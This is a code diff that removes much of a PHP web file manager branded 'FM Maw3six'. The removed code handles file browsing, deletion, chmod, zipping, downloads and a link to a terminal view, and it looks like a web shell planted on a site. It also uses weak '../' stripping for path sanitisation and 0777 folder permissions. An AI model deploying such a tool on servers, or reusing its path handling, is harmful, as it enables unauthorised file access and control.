-            <b><a href="<?php echo fm_enc($file_url) ?>" target="_blank"><i class="icon-chain"></i> Open</a></b> &nbsp;
-            <?php
-            if ($is_zip && $filenames !== false) {
-                $zip_name = pathinfo($file_path, PATHINFO_FILENAME);
-                ?>
-                <b><a href="?p=<?php echo urlencode(FM_PATH) ?>&amp;unzip=<?php echo urlencode($file) ?>"><i class="icon-apply"></i> Unpack</a></b> &nbsp;
-                <b><a href="?p=<?php echo urlencode(FM_PATH) ?>&amp;unzip=<?php echo urlencode($file) ?>&amp;tofolder=1" title="Unpack to <?php echo fm_enc($zip_name) ?>"><i class="icon-apply"></i>
-                    Unpack to folder</a></b> &nbsp;
-                <?php
-            }
-            ?>
-            <b><a href="?p=<?php echo urlencode(FM_PATH) ?>"><i class="icon-goback"></i> Back</a></b>
-        </p>
-        <?php
-        if ($is_zip) {
-            if ($filenames !== false) {
-                echo '<code class="maxheight">';
-                foreach ($filenames as $fn) {
-                    if ($fn['folder']) {
-                        echo '<b>' . fm_enc($fn['name']) . '</b><br>';
-                    } else {
-                        echo $fn['name'] . ' (' . fm_get_filesize($fn['filesize']) . ')<br>';
-                    }
-                }
-                echo '</code>';
-            } else {
-                echo '<p>Error while fetching archive info</p>';
-            }
-        } elseif ($is_image) {
-            if (in_array($ext, array('gif', 'jpg', 'jpeg', 'png', 'bmp', 'ico'))) {
-                echo '<p><img src="' . fm_enc($file_url) . '" alt="" class="preview-img"></p>';
-            }
-        } elseif ($is_audio) {
-            echo '<p><audio src="' . fm_enc($file_url) . '" controls preload="metadata"></audio></p>';
-        } elseif ($is_video) {
-            echo '<div class="preview-video"><video src="' . fm_enc($file_url) . '" width="640" height="360" controls preload="metadata"></video></div>';
-        } elseif ($is_text) {
-            if (FM_USE_HIGHLIGHTJS) {
-                $hljs_classes = array(
-                    'shtml' => 'xml',
-                    'htaccess' => 'apache',
-                    'phtml' => 'php',
-                    'lock' => 'json',
-                    'svg' => 'xml',
-                );
-                $hljs_class = isset($hljs_classes[$ext]) ? 'lang-' . $hljs_classes[$ext] : 'lang-' . $ext;
-                if (empty($ext) || in_array(strtolower($file), fm_get_text_names()) || preg_match('#\.min\.(css|js)$#i', $file)) {
-                    $hljs_class = 'nohighlight';
-                }
-                $content = '<pre class="with-hljs"><code class="' . $hljs_class . '">' . fm_enc($content) . '</code></pre>';
-            } elseif (in_array($ext, array('php', 'php4', 'php5', 'phtml', 'phps'))) {
-                $content = highlight_string($content, true);
-            } else {
-                $content = '<pre>' . fm_enc($content) . '</pre>';
-            }
-            echo $content;
-        }
-        ?>
-    </div>
-    <?php
-    fm_show_footer();
-    exit;
-}
-
-if (isset($_GET['chmod']) && !FM_IS_WIN) {
-    $file = $_GET['chmod'];
-    $file = fm_clean_path($file);
-    $file = str_replace('/', '', $file);
-    if ($file == '' || (!is_file($path . '/' . $file) && !is_dir($path . '/' . $file))) {
-        fm_set_msg('File not found', 'error');
-        fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
-    }
-
-    fm_show_header();
-    fm_show_nav_path(FM_PATH);
-
-    $file_url = FM_ROOT_URL . (FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $file;
-    $file_path = $path . '/' . $file;
-
-    $mode = fileperms($path . '/' . $file);
-
-    ?>
-    <div class="path">
-        <p><b>Change Permissions</b></p>
-        <p>
-            Full path: <?php echo fm_enc($file_path) ?><br>
-        </p>
-        <form action="" method="post">
-            <input type="hidden" name="p" value="<?php echo fm_enc(FM_PATH) ?>">
-            <input type="hidden" name="chmod" value="<?php echo fm_enc($file) ?>">
-
-            <table class="compact-table">
-                <tr>
-                    <td></td>
-                    <td><b>Owner</b></td>
-                    <td><b>Group</b></td>
-                    <td><b>Other</b></td>
-                </tr>
-                <tr>
-                    <td style="text-align: right"><b>Read</b></td>
-                    <td><label><input type="checkbox" name="ur" value="1"<?php echo ($mode & 00400) ? ' checked' : '' ?>></label></td>
-                    <td><label><input type="checkbox" name="gr" value="1"<?php echo ($mode & 00040) ? ' checked' : '' ?>></label></td>
-                    <td><label><input type="checkbox" name="or" value="1"<?php echo ($mode & 00004) ? ' checked' : '' ?>></label></td>
-                </tr>
-                <tr>
-                    <td style="text-align: right"><b>Write</b></td>
-                    <td><label><input type="checkbox" name="uw" value="1"<?php echo ($mode & 00200) ? ' checked' : '' ?>></label></td>
-                    <td><label><input type="checkbox" name="gw" value="1"<?php echo ($mode & 00020) ? ' checked' : '' ?>></label></td>
-                    <td><label><input type="checkbox" name="ow" value="1"<?php echo ($mode & 00002) ? ' checked' : '' ?>></label></td>
-                </tr>
-                <tr>
-                    <td style="text-align: right"><b>Execute</b></td>
-                    <td><label><input type="checkbox" name="ux" value="1"<?php echo ($mode & 00100) ? ' checked' : '' ?>></label></td>
-                    <td><label><input type="checkbox" name="gx" value="1"<?php echo ($mode & 00010) ? ' checked' : '' ?>></label></td>
-                    <td><label><input type="checkbox" name="ox" value="1"<?php echo ($mode & 00001) ? ' checked' : '' ?>></label></td>
-                </tr>
-            </table>
-
-            <p>
-                <button class="btn"><i class="icon-apply"></i> Change</button> &nbsp;
-                <b><a href="?p=<?php echo urlencode(FM_PATH) ?>"><i class="icon-cancel"></i> Cancel</a></b>
-            </p>
-
-        </form>
-
-    </div>
-    <?php
-    fm_show_footer();
-    exit;
-}
-
-fm_show_header();
-fm_show_nav_path(FM_PATH);
-
-fm_show_message();
-
-$num_files = count($files);
-$num_folders = count($folders);
-$all_files_size = 0;
+if (!isAuthenticated()) :
 ?>
-<form action="" method="post">
-<input type="hidden" name="p" value="<?php echo fm_enc(FM_PATH) ?>">
-<input type="hidden" name="group" value="1">
-<table><tr>
-<th style="width:3%"><label><input type="checkbox" title="Invert selection" onclick="checkbox_toggle()"></label></th>
-<th>Name</th><th style="width:10%">Size</th>
-<th style="width:12%">Modified</th>
-<?php if (!FM_IS_WIN): ?><th style="width:6%">Perms</th><th style="width:10%">Owner</th><?php endif; ?>
-<th style="width:13%"></th></tr>
-<?php
-if ($parent !== false) {
-    ?>
-<tr><td></td><td colspan="<?php echo !FM_IS_WIN ? '6' : '4' ?>"><a href="?p=<?php echo urlencode($parent) ?>"><i class="icon-arrow_up"></i> ..</a></td></tr>
-<?php
-}
-foreach ($folders as $f) {
-    $is_link = is_link($path . '/' . $f);
-    $img = $is_link ? 'icon-link_folder' : 'icon-folder';
-    $modif = date(FM_DATETIME_FORMAT, filemtime($path . '/' . $f));
-    $perms = substr(decoct(fileperms($path . '/' . $f)), -4);
-    if (function_exists('posix_getpwuid') && function_exists('posix_getgrgid')) {
-        $owner = posix_getpwuid(fileowner($path . '/' . $f));
-        $group = posix_getgrgid(filegroup($path . '/' . $f));
-    } else {
-        $owner = array('name' => '?');
-        $group = array('name' => '?');
-    }
-    ?>
-<tr>
-<td><label><input type="checkbox" name="file[]" value="<?php echo fm_enc($f) ?>"></label></td>
-<td><div class="filename"><a href="?p=<?php echo urlencode(trim(FM_PATH . '/' . $f, '/')) ?>"><i class="<?php echo $img ?>"></i> <?php echo fm_enc(fm_convert_win($f)) ?></a><?php echo ($is_link ? ' &rarr; <i>' . fm_enc(readlink($path . '/' . $f)) . '</i>' : '') ?></div></td>
-<td>Folder</td><td><?php echo $modif ?></td>
-<?php if (!FM_IS_WIN): ?>
-<td><a title="Change Permissions" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;chmod=<?php echo urlencode($f) ?>"><?php echo $perms ?></a></td>
-<td><?php echo fm_enc($owner['name'] . ':' . $group['name']) ?></td>
-<?php endif; ?>
-<td>
-<a title="Delete" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;del=<?php echo urlencode($f) ?>" onclick="return confirm('Delete folder?');"><i class="icon-cross"></i></a>
-<a title="Rename" href="#" onclick="rename('<?php echo fm_enc(FM_PATH) ?>', '<?php echo fm_enc($f) ?>');return false;"><i class="icon-rename"></i></a>
-<a title="Copy to..." href="?p=&amp;copy=<?php echo urlencode(trim(FM_PATH . '/' . $f, '/')) ?>"><i class="icon-copy"></i></a>
-<a title="Direct link" href="<?php echo fm_enc(FM_ROOT_URL . (FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $f . '/') ?>" target="_blank"><i class="icon-chain"></i></a>
-</td></tr>
-    <?php
-    flush();
-}
-
-foreach ($files as $f) {
-    $is_link = is_link($path . '/' . $f);
-    $img = $is_link ? 'icon-link_file' : fm_get_file_icon_class($path . '/' . $f);
-    $modif = date(FM_DATETIME_FORMAT, filemtime($path . '/' . $f));
-    $filesize_raw = filesize($path . '/' . $f);
-    $filesize = fm_get_filesize($filesize_raw);
-    $filelink = '?p=' . urlencode(FM_PATH) . '&view=' . urlencode($f);
-    $all_files_size += $filesize_raw;
-    $perms = substr(decoct(fileperms($path . '/' . $f)), -4);
-    if (function_exists('posix_getpwuid') && function_exists('posix_getgrgid')) {
-        $owner = posix_getpwuid(fileowner($path . '/' . $f));
-        $group = posix_getgrgid(filegroup($path . '/' . $f));
-    } else {
-        $owner = array('name' => '?');
-        $group = array('name' => '?');
-    }
-    ?>
-<tr>
-<td><label><input type="checkbox" name="file[]" value="<?php echo fm_enc($f) ?>"></label></td>
-<td><div class="filename"><a href="<?php echo fm_enc($filelink) ?>" title="File info"><i class="<?php echo $img ?>"></i> <?php echo fm_enc(fm_convert_win($f)) ?></a><?php echo ($is_link ? ' &rarr; <i>' . fm_enc(readlink($path . '/' . $f)) . '</i>' : '') ?></div></td>
-<td><span class="gray" title="<?php printf('%s bytes', $filesize_raw) ?>"><?php echo $filesize ?></span></td>
-<td><?php echo $modif ?></td>
-<?php if (!FM_IS_WIN): ?>
-<td><a title="Change Permissions" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;chmod=<?php echo urlencode($f) ?>"><?php echo $perms ?></a></td>
-<td><?php echo fm_enc($owner['name'] . ':' . $group['name']) ?></td>
-<?php endif; ?>
-<td>
-<a title="Delete" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;del=<?php echo urlencode($f) ?>" onclick="return confirm('Delete file?');"><i class="icon-cross"></i></a>
-<a title="Rename" href="#" onclick="rename('<?php echo fm_enc(FM_PATH) ?>', '<?php echo fm_enc($f) ?>');return false;"><i class="icon-rename"></i></a>
-<a title="Copy to..." href="?p=<?php echo urlencode(FM_PATH) ?>&amp;copy=<?php echo urlencode(trim(FM_PATH . '/' . $f, '/')) ?>"><i class="icon-copy"></i></a>
-<a title="Direct link" href="<?php echo fm_enc(FM_ROOT_URL . (FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $f) ?>" target="_blank"><i class="icon-chain"></i></a>
-<a title="Download" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;dl=<?php echo urlencode($f) ?>"><i class="icon-download"></i></a>
-</td></tr>
-    <?php
-    flush();
-}
-
-if (empty($folders) && empty($files)) {
-    ?>
-<tr><td></td><td colspan="<?php echo !FM_IS_WIN ? '6' : '4' ?>"><em>Folder is empty</em></td></tr>
-<?php
-} else {
-    ?>
-<tr><td class="gray"></td><td class="gray" colspan="<?php echo !FM_IS_WIN ? '6' : '4' ?>">
-Full size: <span title="<?php printf('%s bytes', $all_files_size) ?>"><?php echo fm_get_filesize($all_files_size) ?></span>,
-files: <?php echo $num_files ?>,
-folders: <?php echo $num_folders ?>
-</td></tr>
-<?php
-}
-?>
-</table>
-<p class="path"><a href="#" onclick="select_all();return false;"><i class="icon-checkbox"></i> Select all</a> &nbsp;
-<a href="#" onclick="unselect_all();return false;"><i class="icon-checkbox_uncheck"></i> Unselect all</a> &nbsp;
-<a href="#" onclick="invert_all();return false;"><i class="icon-checkbox_invert"></i> Invert selection</a></p>
-<p class="action-buttons">
-    <button type="submit" name="delete" class="btn-neon" onclick="return confirm('Delete selected files and folders?')">
-        <i class="fas fa-trash"></i> Delete
-    </button>
-    <button type="submit" name="zip" class="btn-neon" onclick="return confirm('Create archive?')">
-        <i class="fas fa-file-zipper"></i> Pack
-    </button>
-    <button type="submit" name="copy" class="btn-neon">
-        <i class="fas fa-copy"></i> Copy
-    </button>
-</p>
-</form>
-
-<?php
-fm_show_footer();
-
-/**
- * Delete  file or folder (recursively)
- * @param string $path
- * @return bool
- */
-function fm_rdelete($path)
-{
-    if (is_link($path)) {
-        return unlink($path);
-    } elseif (is_dir($path)) {
-        $objects = scandir($path);
-        $ok = true;
-        if (is_array($objects)) {
-            foreach ($objects as $file) {
-                if ($file != '.' && $file != '..') {
-                    if (!fm_rdelete($path . '/' . $file)) {
-                        $ok = false;
-                    }
-                }
-            }
-        }
-        return ($ok) ? rmdir($path) : false;
-    } elseif (is_file($path)) {
-        return unlink($path);
-    }
-    return false;
-}
-
-/**
- * Recursive chmod
- * @param string $path
- * @param int $filemode
- * @param int $dirmode
- * @return bool
- * @todo Will use in mass chmod
- */
-function fm_rchmod($path, $filemode, $dirmode)
-{
-    if (is_dir($path)) {
-        if (!chmod($path, $dirmode)) {
-            return false;
-        }
-        $objects = scandir($path);
-        if (is_array($objects)) {
-            foreach ($objects as $file) {
-                if ($file != '.' && $file != '..') {
-                    if (!fm_rchmod($path . '/' . $file, $filemode, $dirmode)) {
-                        return false;
-                    }
-                }
-            }
-        }
-        return true;
-    } elseif (is_link($path)) {
-        return true;
-    } elseif (is_file($path)) {
-        return chmod($path, $filemode);
-    }
-    return false;
-}
-
-/**
- * Safely rename
- * @param string $old
- * @param string $new
- * @return bool|null
- */
-function fm_rename($old, $new)
-{
-    return (!file_exists($new) && file_exists($old)) ? rename($old, $new) : null;
-}
-
-/**
- * Copy file or folder (recursively).
- * @param string $path
- * @param string $dest
- * @param bool $upd Update files
- * @param bool $force Create folder with same names instead file
- * @return bool
- */
-function fm_rcopy($path, $dest, $upd = true, $force = true)
-{
-    if (is_dir($path)) {
-        if (!fm_mkdir($dest, $force)) {
-            return false;
-        }
-        $objects = scandir($path);
-        $ok = true;
-        if (is_array($objects)) {
-            foreach ($objects as $file) {
-                if ($file != '.' && $file != '..') {
-                    if (!fm_rcopy($path . '/' . $file, $dest . '/' . $file)) {
-                        $ok = false;
-                    }
-                }
-            }
-        }
-        return $ok;
-    } elseif (is_file($path)) {
-        return fm_copy($path, $dest, $upd);
-    }
-    return false;
-}
-
-/**
- * Safely create folder
- * @param string $dir
- * @param bool $force
- * @return bool
- */
-function fm_mkdir($dir, $force)
-{
-    if (file_exists($dir)) {
-        if (is_dir($dir)) {
-            return $dir;
-        } elseif (!$force) {
-            return false;
-        }
-        unlink($dir);
-    }
-    return mkdir($dir, 0777, true);
-}
-
-/**
- * Safely copy file
- * @param string $f1
- * @param string $f2
- * @param bool $upd
- * @return bool
- */
-function fm_copy($f1, $f2, $upd)
-{
-    $time1 = filemtime($f1);
-    if (file_exists($f2)) {
-        $time2 = filemtime($f2);
-        if ($time2 >= $time1 && $upd) {
-            return false;
-        }
-    }
-    $ok = copy($f1, $f2);
-    if ($ok) {
-        touch($f2, $time1);
-    }
-    return $ok;
-}
-
-/**
- * Get mime type
- * @param string $file_path
- * @return mixed|string
- */
-function fm_get_mime_type($file_path)
-{
-    if (function_exists('finfo_open')) {
-        $finfo = finfo_open(FILEINFO_MIME_TYPE);
-        $mime = finfo_file($finfo, $file_path);
-        finfo_close($finfo);
-        return $mime;
-    } elseif (function_exists('mime_content_type')) {
-        return mime_content_type($file_path);
-    } elseif (!stristr(ini_get('disable_functions'), 'shell_exec')) {
-        $file = escapeshellarg($file_path);
-        $mime = shell_exec('file -bi ' . $file);
-        return $mime;
-    } else {
-        return '--';
-    }
-}
-
-/**
- * HTTP Redirect
- * @param string $url
- * @param int $code
- */
-function fm_redirect($url, $code = 302)
-{
-    header('Location: ' . $url, true, $code);
-    exit;
-}
-
-/**
- * Clean path
- * @param string $path
- * @return string
- */
-function fm_clean_path($path)
-{
-    $path = trim($path);
-    $path = trim($path, '\\/');
-    $path = str_replace(array('../', '..\\'), '', $path);
-    if ($path == '..') {
-        $path = '';
-    }
-    return str_replace('\\', '/', $path);
-}
-
-/**
- * Get parent path
- * @param string $path
- * @return bool|string
- */
-function fm_get_parent_path($path)
-{
-    $path = fm_clean_path($path);
-    if ($path != '') {
-        $array = explode('/', $path);
-        if (count($array) > 1) {
-            $array = array_slice($array, 0, -1);
-            return implode('/', $array);
-        }
-        return '';
-    }
-    return false;
-}
-
-/**
- * Get nice filesize
- * @param int $size
- * @return string
- */
-function fm_get_filesize($size)
-{
-    if ($size < 1000) {
-        return sprintf('%s B', $size);
-    } elseif (($size / 1024) < 1000) {
-        return sprintf('%s KiB', round(($size / 1024), 2));
-    } elseif (($size / 1024 / 1024) < 1000) {
-        return sprintf('%s MiB', round(($size / 1024 / 1024), 2));
-    } elseif (($size / 1024 / 1024 / 1024) < 1000) {
-        return sprintf('%s GiB', round(($size / 1024 / 1024 / 1024), 2));
-    } else {
-        return sprintf('%s TiB', round(($size / 1024 / 1024 / 1024 / 1024), 2));
-    }
-}
-
-/**
- * Get info about zip archive
- * @param string $path
- * @return array|bool
- */
-function fm_get_zif_info($path)
-{
-    if (function_exists('zip_open')) {
-        $arch = zip_open($path);
-        if ($arch) {
-            $filenames = array();
-            while ($zip_entry = zip_read($arch)) {
-                $zip_name = zip_entry_name($zip_entry);
-                $zip_folder = substr($zip_name, -1) == '/';
-                $filenames[] = array(
-                    'name' => $zip_name,
-                    'filesize' => zip_entry_filesize($zip_entry),
-                    'compressed_size' => zip_entry_compressedsize($zip_entry),
-                    'folder' => $zip_folder
-                    //'compression_method' => zip_entry_compressionmethod($zip_entry),
-                );
-            }
-            zip_close($arch);
-            return $filenames;
-        }
-    }
-    return false;
-}
-
-/**
- * Encode html entities
- * @param string $text
- * @return string
- */
-function fm_enc($text)
-{
-    return htmlspecialchars($text, ENT_QUOTES, 'UTF-8');
-}
-
-/**
- * Save message in session
- * @param string $msg
- * @param string $status
- */
-function fm_set_msg($msg, $status = 'ok')
-{
-    $_SESSION['message'] = $msg;
-    $_SESSION['status'] = $status;
-}
-
-/**
- * Check if string is in UTF-8
- * @param string $string
- * @return int
- */
-function fm_is_utf8($string)
-{
-    return preg_match('//u', $string);
-}
-
-/**
- * Convert file name to UTF-8 in Windows
- * @param string $filename
- * @return string
- */
-function fm_convert_win($filename)
-{
-    if (FM_IS_WIN && function_exists('iconv')) {
-        $filename = iconv(FM_ICONV_INPUT_ENC, 'UTF-8//IGNORE', $filename);
-    }
-    return $filename;
-}
-
-/**
- * Get CSS classname for file
- * @param string $path
- * @return string
- */
-function fm_get_file_icon_class($path)
-{
-    // get extension
-    $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
-
-    switch ($ext) {
-        case 'ico': case 'gif': case 'jpg': case 'jpeg': case 'jpc': case 'jp2':
-        case 'jpx': case 'xbm': case 'wbmp': case 'png': case 'bmp': case 'tif':
-        case 'tiff':
-            $img = 'icon-file_image';
-            break;
-        case 'txt': case 'css': case 'ini': case 'conf': case 'log': case 'htaccess':
-        case 'passwd': case 'ftpquota': case 'sql': case 'js': case 'json': case 'sh':
-        case 'config': case 'twig': case 'tpl': case 'md': case 'gitignore':
-        case 'less': case 'sass': case 'scss': case 'c': case 'cpp': case 'cs': case 'py':
-        case 'map': case 'lock': case 'dtd':
-            $img = 'icon-file_text';
-            break;
-        case 'zip': case 'rar': case 'gz': case 'tar': case '7z':
-            $img = 'icon-file_zip';
-            break;
-        case 'php': case 'php4': case 'php5': case 'phps': case 'phtml':
-            $img = 'icon-file_php';
-            break;
-        case 'htm': case 'html': case 'shtml': case 'xhtml':
-            $img = 'icon-file_html';
-            break;
-        case 'xml': case 'xsl': case 'svg':
-            $img = 'icon-file_code';
-            break;
-        case 'wav': case 'mp3': case 'mp2': case 'm4a': case 'aac': case 'ogg':
-        case 'oga': case 'wma': case 'mka': case 'flac': case 'ac3': case 'tds':
-            $img = 'icon-file_music';
-            break;
-        case 'm3u': case 'm3u8': case 'pls': case 'cue':
-            $img = 'icon-file_playlist';
-            break;
-        case 'avi': case 'mpg': case 'mpeg': case 'mp4': case 'm4v': case 'flv':
-        case 'f4v': case 'ogm': case 'ogv': case 'mov': case 'mkv': case '3gp':
-        case 'asf': case 'wmv':
-            $img = 'icon-file_film';
-            break;
-        case 'eml': case 'msg':
-            $img = 'icon-file_outlook';
-            break;
-        case 'xls': case 'xlsx':
-            $img = 'icon-file_excel';
-            break;
-        case 'csv':
-            $img = 'icon-file_csv';
-            break;
-        case 'doc': case 'docx':
-            $img = 'icon-file_word';
-            break;
-        case 'ppt': case 'pptx':
-            $img = 'icon-file_powerpoint';
-            break;
-        case 'ttf': case 'ttc': case 'otf': case 'woff':case 'woff2': case 'eot': case 'fon':
-            $img = 'icon-file_font';
-            break;
-        case 'pdf':
-            $img = 'icon-file_pdf';
-            break;
-        case 'psd':
-            $img = 'icon-file_photoshop';
-            break;
-        case 'ai': case 'eps':
-            $img = 'icon-file_illustrator';
-            break;
-        case 'fla':
-            $img = 'icon-file_flash';
-            break;
-        case 'swf':
-            $img = 'icon-file_swf';
-            break;
-        case 'exe': case 'msi':
-            $img = 'icon-file_application';
-            break;
-        case 'bat':
-            $img = 'icon-file_terminal';
-            break;
-        default:
-            $img = 'icon-document';
-    }
-
-    return $img;
-}
-
-/**
- * Get image files extensions
- * @return array
- */
-function fm_get_image_exts()
-{
-    return array('ico', 'gif', 'jpg', 'jpeg', 'jpc', 'jp2', 'jpx', 'xbm', 'wbmp', 'png', 'bmp', 'tif', 'tiff', 'psd');
-}
-
-/**
- * Get video files extensions
- * @return array
- */
-function fm_get_video_exts()
-{
-    return array('webm', 'mp4', 'm4v', 'ogm', 'ogv', 'mov');
-}
-
-/**
- * Get audio files extensions
- * @return array
- */
-function fm_get_audio_exts()
-{
-    return array('wav', 'mp3', 'ogg', 'm4a');
-}
-
-/**
- * Get text file extensions
- * @return array
- */
-function fm_get_text_exts()
-{
-    return array(
-        'txt', 'css', 'ini', 'conf', 'log', 'htaccess', 'passwd', 'ftpquota', 'sql', 'js', 'json', 'sh', 'config',
-        'php', 'php4', 'php5', 'phps', 'phtml', 'htm', 'html', 'shtml', 'xhtml', 'xml', 'xsl', 'm3u', 'm3u8', 'pls', 'cue',
-        'eml', 'msg', 'csv', 'bat', 'twig', 'tpl', 'md', 'gitignore', 'less', 'sass', 'scss', 'c', 'cpp', 'cs', 'py',
-        'map', 'lock', 'dtd', 'svg',
-    );
-}
-
-/**
- * Get mime types of text files
- * @return array
- */
-function fm_get_text_mimes()
-{
-    return array(
-        'application/xml',
-        'application/javascript',
-        'application/x-javascript',
-        'image/svg+xml',
-        'message/rfc822',
-    );
-}
-
-/**
- * Get file names of text files w/o extensions
- * @return array
- */
-function fm_get_text_names()
-{
-    return array(
-        'license',
-        'readme',
-        'authors',
-        'contributors',
-        'changelog',
-    );
-}
-
-/**
- * Class to work with zip files (using ZipArchive)
- */
-class FM_Zipper
-{
-    private $zip;
-
-    public function __construct()
-    {
-        $this->zip = new ZipArchive();
-    }
-
-    /**
-     * Create archive with name $filename and files $files (RELATIVE PATHS!)
-     * @param string $filename
-     * @param array|string $files
-     * @return bool
-     */
-    public function create($filename, $files)
-    {
-        $res = $this->zip->open($filename, ZipArchive::CREATE);
-        if ($res !== true) {
-            return false;
-        }
-        if (is_array($files)) {
-            foreach ($files as $f) {
-                if (!$this->addFileOrDir($f)) {
-                    $this->zip->close();
-                    return false;
-                }
-            }
-            $this->zip->close();
-            return true;
-        } else {
-            if ($this->addFileOrDir($files)) {
-                $this->zip->close();
-                return true;
-            }
-            return false;
-        }
-    }
-
-    /**
-     * Extract archive $filename to folder $path (RELATIVE OR ABSOLUTE PATHS)
-     * @param string $filename
-     * @param string $path
-     * @return bool
-     */
-    public function unzip($filename, $path)
-    {
-        $res = $this->zip->open($filename);
-        if ($res !== true) {
-            return false;
-        }
-        if ($this->zip->extractTo($path)) {
-            $this->zip->close();
-            return true;
-        }
-        return false;
-    }
-
-    /**
-     * Add file/folder to archive
-     * @param string $filename
-     * @return bool
-     */
-    private function addFileOrDir($filename)
-    {
-        if (is_file($filename)) {
-            return $this->zip->addFile($filename);
-        } elseif (is_dir($filename)) {
-            return $this->addDir($filename);
-        }
-        return false;
-    }
-
-    /**
-     * Add folder recursively
-     * @param string $path
-     * @return bool
-     */
-    private function addDir($path)
-    {
-        if (!$this->zip->addEmptyDir($path)) {
-            return false;
-        }
-        $objects = scandir($path);
-        if (is_array($objects)) {
-            foreach ($objects as $file) {
-                if ($file != '.' && $file != '..') {
-                    if (is_dir($path . '/' . $file)) {
-                        if (!$this->addDir($path . '/' . $file)) {
-                            return false;
-                        }
-                    } elseif (is_file($path . '/' . $file)) {
-                        if (!$this->zip->addFile($path . '/' . $file)) {
-                            return false;
-                        }
-                    }
-                }
-            }
-            return true;
-        }
-        return false;
-    }
-}
-
-//--- templates functions
-
-/**
- * Show nav block
- * @param string $path
- */
-function fm_show_nav_path($path)
-{
-    ?>
-<div class="path">
-<div class="float-right">
-<a title="Terminal" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;view=terminal"><i class="icon-file_terminal"></i></a>
-<a title="Upload files" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;upload"><i class="icon-upload"></i></a>
-<a title="New folder" href="#" onclick="newfolder('<?php echo fm_enc(FM_PATH) ?>');return false;"><i class="icon-folder_add"></i></a>
-<?php if (FM_USE_AUTH): ?><a title="Logout" href="?logout=1"><i class="icon-logout"></i></a><?php endif; ?>
-</div>
-        <?php
-        $path = fm_clean_path($path);
-        $root_url = "<a href='?p='><i class='icon-home' title='" . FM_ROOT_PATH . "'></i></a>";
-        $sep = '<i class="icon-separator"></i>';
-        if ($path != '') {
-            $exploded = explode('/', $path);
-            $count = count($exploded);
-            $array = array();
-            $parent = '';
-            for ($i = 0; $i < $count; $i++) {
-                $parent = trim($parent . '/' . $exploded[$i], '/');
-                $parent_enc = urlencode($parent);
-                $array[] = "<a href='?p={$parent_enc}'>" . fm_enc(fm_convert_win($exploded[$i])) . "</a>";
-            }
-            $root_url .= $sep . implode($sep, $array);
-        }
-        echo '<div class="break-word">' . $root_url . '</div>';
-        ?>
-</div>
-<?php
-}
-
-/**
- * Show message from session
- */
-function fm_show_message()
-{
-    if (isset($_SESSION['message'])) {
-        $class = isset($_SESSION['status']) ? $_SESSION['status'] : 'ok';
-        echo '<p class="message ' . $class . '">' . $_SESSION['message'] . '</p>';
-        unset($_SESSION['message']);
-        unset($_SESSION['status']);
-    }
-}
-
-/**
- * Show page header
- */
-function fm_show_header()
-{
-    $sprites_ver = '20160315';
-    header("Content-Type: text/html; charset=utf-8");
-    header("Expires: Sat, 26 Jul 1997 05:00:00 GMT");
-    header("Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0");
-    header("Pragma: no-cache");
-    ?>
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<meta charset="utf-8">
-<title>FM Maw3six</title>
-<style>
-/* Import Font Awesome for icons */
-@import url('https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css');
-
-html,body,div,span,p,pre,a,code,em,img,small,strong,ol,ul,li,form,label,table,tr,th,td{margin:0;padding:0;vertical-align:baseline;outline:none;font-size:100%;background:transparent;border:none;text-decoration:none}
-html{overflow-y:scroll}
-body{
-    padding:0;
-    font:13px/16px 'Segoe UI', 'Roboto', Arial, sans-serif;
-    color:#e0e0e0;
-    background:#0a0a0a;
-    background-image: 
-        radial-gradient(circle at 20% 50%, rgba(0, 255, 255, 0.03) 0%, transparent 50%),
-        radial-gradient(circle at 80% 80%, rgba(138, 43, 226, 0.03) 0%, transparent 50%);
-}
-input,select,textarea,button{font-size:inherit;font-family:inherit}
-a{
-    color:#00d9ff;
-    text-decoration:none;
-    transition:all 0.3s ease;
-}
-a:hover{
-    color:#ff00ff;
-    text-shadow:0 0 10px rgba(255, 0, 255, 0.5);
-}
-img{vertical-align:middle;border:none}
-a img{border:none}
-span.gray{color:#888}
-small{font-size:11px;color:#666}
-p{margin-bottom:10px}
-ul{margin-left:2em;margin-bottom:10px}
-ul{list-style-type:none;margin-left:0}
-ul li{padding:3px 0}
-table{
-    border-collapse:collapse;
-    border-spacing:0;
-    margin-bottom:10px;
-    width:100%;
-    box-shadow:0 0 20px rgba(0, 217, 255, 0.1);
-}
-th,td{
-    padding:10px 15px;
-    text-align:left;
-    vertical-align:top;
-    border:1px solid #1a1a1a;
-    background:#0f0f0f;
-    white-space:nowrap;
-    transition:all 0.3s ease;
-}
-th,td.gray{
-    background:linear-gradient(135deg, #1a1a1a 0%, #0f0f0f 100%);
-    color:#00d9ff;
-    font-weight:600;
-    border-bottom:2px solid #00d9ff;
-}
-td.gray span{color:#e0e0e0}
-tr:hover td{
-    background:#1a1a1a;
-    box-shadow:inset 0 0 15px rgba(0, 217, 255, 0.1);
-}
-tr:hover td.gray{
-    background:linear-gradient(135deg, #1a1a1a 0%, #0f0f0f 100%);
-}
-code,pre{
-    display:block;
-    margin-bottom:10px;
-    font:13px/16px 'Fira Code', 'Consolas', monospace;
-    border:1px solid #00d9ff;
-    background:#0a0a0a;
-    padding:10px;
-    overflow:auto;
-    box-shadow:0 0 15px rgba(0, 217, 255, 0.2);
-}
-pre.with-hljs{padding:0}
-pre.with-hljs code{margin:0;border:0;overflow:visible}
-code.maxheight,pre.maxheight{max-height:512px}
-input[type="checkbox"]{margin:0;padding:0}
-#wrapper{
-    max-width:1000px;
-    min-width:400px;
-    margin:10px auto;
-}
-.path{
-    padding:10px 15px;
-    border:1px solid #00d9ff;
-    background:linear-gradient(135deg, #0f0f0f 0%, #1a1a1a 100%);
-    margin-bottom:10px;
-    box-shadow:0 0 15px rgba(0, 217, 255, 0.2);
-    border-radius:3px;
-    color:#00d9ff;
-    font-weight:500;
-}
-.right{text-align:right}
-.center{text-align:center}
